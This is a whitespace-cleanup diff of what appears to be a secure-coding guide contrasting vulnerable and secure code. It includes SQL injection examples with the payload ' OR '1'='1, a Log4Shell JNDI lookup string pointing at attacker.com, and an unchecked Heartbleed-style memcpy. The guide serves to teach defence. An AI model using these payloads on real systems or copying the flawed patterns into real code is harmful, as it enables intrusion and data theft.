@@ -355,12 +355,12 @@ flowchart LR
 ```php
 <?php
 // ❌ Vulnerable: directly inserting user input into query
-$username = $_GET['user']; 
-$password = $_GET['pass']; 
-$query = "SELECT * FROM users WHERE user = '$username' AND pass = '$password'"; 
+$username = $_GET['user'];
+$password = $_GET['pass'];
+$query = "SELECT * FROM users WHERE user = '$username' AND pass = '$password'";
 $result = mysqli_query($conn, $query);
 
-// An attacker could input: 
+// An attacker could input:
 // user=admin&pass=' OR '1'='1
 // Query becomes:
 // SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1';
@@ -376,8 +376,8 @@ $result = mysqli_query($conn, $query);
 <?php
 // ✅ Secure: using parameterized queries (prepared statements)
 $stmt = $conn->prepare("SELECT * FROM users WHERE user=? AND pass=?");
-$stmt->bind_param("ss", $username, $password); 
-$stmt->execute(); 
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
 $result = $stmt->get_result();
 
 // Now even if attacker tries ' OR '1'='1, it is treated as a string, not SQL
@@ -482,7 +482,7 @@ $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
 ```php
 <?php
 // ✅ Secure: use password hashing and verification
-$hash = password_hash($pass, PASSWORD_BCRYPT); 
+$hash = password_hash($pass, PASSWORD_BCRYPT);
 if (password_verify($pass, $stored_hash)) {
    echo "Login success";
 }
@@ -774,7 +774,7 @@ flowchart TD
 
 ```python
 # ❌ Insecure: concatenating user input into SQL query
-query = "SELECT * FROM users WHERE id=" + user_input  
+query = "SELECT * FROM users WHERE id=" + user_input
 
 # ✅ Secure: parameterized query (avoids SQL injection)
 cursor.execute("SELECT * FROM users WHERE id=%s", (user_input,))
@@ -1149,7 +1149,7 @@ logger.error("${jndi:ldap://attacker.com/exploit}");
 
 ```c
 /* ❌ Vulnerable OpenSSL heartbeat extension */
-memcpy(buffer, payload, payload_length);  
+memcpy(buffer, payload, payload_length);
 // No bounds check → attacker requests more bytes than provided
 ```
 
